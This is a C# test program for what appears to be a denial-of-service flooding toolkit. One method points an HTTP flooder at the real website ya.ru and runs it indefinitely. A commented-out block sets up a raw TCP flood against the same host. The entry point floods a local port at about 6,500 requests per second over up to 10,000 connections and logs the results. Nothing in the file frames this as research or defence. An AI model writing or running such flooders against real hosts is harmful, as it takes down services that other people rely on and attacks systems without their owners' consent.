using System;
using System.Diagnostics;
using System.Net;
using System.Threading;
using GAS.Core.AttackInformation;
using GAS.Core.Attacks;

namespace TestApp {
    class Program {
        static void _Main( string[] args ) {
            var r = new FastRandom.FastRandom();
            Debug.Listeners.Add( new ConsoleTraceListener( true ) );
            //var f = new AsyncFlooder(
            //    new AttackInfo {
            //        Protocol = ProtocolType.Tcp,
            //        Target = new IPEndPoint(
            //            Dns.GetHostAddresses(
            //                "ya.ru"
            //            )[ 0 ],
            //            80
            //        ),
            //        Randomizer = ( a, b ) => {
            //            r.NextBytes( a );
            //            return a.Length;
            //        },
            //        MaxRead = 0,
            //        sendBufferSize = 50000
            //    },
            //    5
            //);

            var f = new AwesomeHttpFlooder(
                new IPEndPoint(
                    Dns.GetHostAddresses( "ya.ru" )[ 0 ],
                    80 ),
                new HttpAttackParams {
                    AttackType = HttpAttackType.Deafult,
                    Dns = "ya.ru",
                    Gzip = true,
                    Query = "/",
                    RandomAppendHost = false,
                    RandomAppendUrl = false,
                    WaitForResponse = false
                }
            );
            f.Start();
            Thread.Sleep(Timeout.InfiniteTimeSpan);
        }

        private static void Main() {
            var f = new AsyncHttpFlooder();
            f.Target = new IPEndPoint( IPAddress.Parse( "127.0.0.1" ), 8118 );
            f.Interval = 10; f.Threads = 100; // ~6.5K RPS
            f.MaxTasks = 10000; //10K connections max
            f.Start();
            for (var i = 0; i < 200; i++) {
                Thread.Sleep( 100 );
                Console.WriteLine(
                    "Total :{0} Running: {1} Failed: {2}",
                    f.Requested,
                    f.TaskCount,
                    f.Failed
                );
            }
            f.Stop();
            Console.WriteLine( "Finished" );
            Console.WriteLine( f.Requested );
            Console.WriteLine( f.Failed );
            Console.ReadLine();
        }
    }
}
